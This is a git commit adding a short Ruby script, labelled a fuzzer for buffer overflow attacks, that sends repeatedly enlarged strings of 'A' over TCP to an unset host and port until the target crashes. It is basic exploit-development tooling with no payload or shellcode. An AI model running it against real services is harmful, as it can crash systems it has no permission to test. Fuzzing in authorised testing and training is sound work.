7f67e22976c9cf567194993953db03d978541f55
BypassASLR <160382321+BypassASLR@users.noreply.github.com>
2024-02-18 06:44:55 +0000

    Add files via upload

---
+++ fuzzer.rb
@@ -0,0 +1,47 @@
+# a Ruby Fuzzer for Buffer Overflow Attacks , Twitter @BypassASLR
+
+require 'socket'
+
+buffer = "A" 
+host = ""
+port = "" 
+fuzz = 40 # the code is going to fuzz the program 40 times 
+
+
+
+puts "Starting Exploit"
+
+def send_req(host, port, buffer)
+
+
+
+
+  begin
+
+
+
+    request = buffer 
+
+
+    s = TCPSocket.open(host, port)
+    s.recv(1024)
+    puts "Sending Payload :  #{request.size} bytes" 
+    s.send(request, 0)
+    s.close
+
+  rescue Errno::ECONNREFUSED
+    puts "The Target is not Running."
+    exit!
+
+  rescue Errno::ECONNRESET
+    puts "Target Crashed"
+    exit!
+
+
+  end
+
+
+
+end
+
+fuzz.times {|n| send_req(host, port, (buffer += buffer * n)) ; sleep 1 } 
